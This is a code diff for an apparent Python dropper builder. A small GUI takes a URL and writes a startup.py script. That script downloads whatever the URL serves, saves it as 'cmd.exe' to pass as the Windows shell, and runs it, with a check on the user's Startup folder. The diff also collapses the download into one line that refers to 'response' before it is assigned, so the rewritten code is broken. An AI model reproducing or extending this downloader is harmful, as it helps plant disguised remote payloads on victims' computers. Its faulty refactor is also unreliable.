@@ -5,13 +5,10 @@ def Submit():
     link = url.get()
     with open("startup.py", "w") as writer:
         writer.write(fr"""
-import requests
-import os
+import requests, os
 cmd_exe = os.path.exists(fr'C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\cmd.exe')
-if cmd_exe == False:
-    URL = '{link}'
-    response = requests.get(URL)
-    open('cmd.exe', 'wb').write(response.content)
+URL = '{link}'
+if cmd_exe == False: response = requests.get(URL), open('cmd.exe', 'wb').write(response.content)
 os.startfile('cmd.exe')
 """)
 Label(root, text="write your application URL: ").place(x=15, y=15)
